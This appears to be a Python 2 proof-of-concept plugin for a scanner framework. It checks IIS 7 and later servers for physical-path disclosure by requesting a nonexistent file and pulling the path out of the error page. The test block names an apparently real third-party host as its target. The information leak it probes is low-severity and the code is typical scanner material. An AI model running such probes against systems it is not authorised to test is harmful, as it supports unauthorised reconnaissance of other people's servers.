#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import urlparse

"""
POC Name  :  IIS7以上物理路径泄露
References:  
Author    :  13
QQ        :  779408317
"""

from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + 'testvulxxxxxxxxxxxxxxxxxxxx'
        code, head, body, error, _ = curl.curl(url)
        #修正正则，可匹配非中文情况
        m=re.search(r'</th><td>[(&nbsp;)]*(.+)\\testvulxxxxxxxxxxxxxxxxxxxx',body)
        if m:
            output(m.group(1),result,'info')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  iis  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='path get Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/middle/iis/iis_7158291cc93fa16509d8f1b2c5931f80.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_7158291cc93fa16509d8f1b2c5931f80.py
#/root/github/poccreate/codesrc/exp-342.py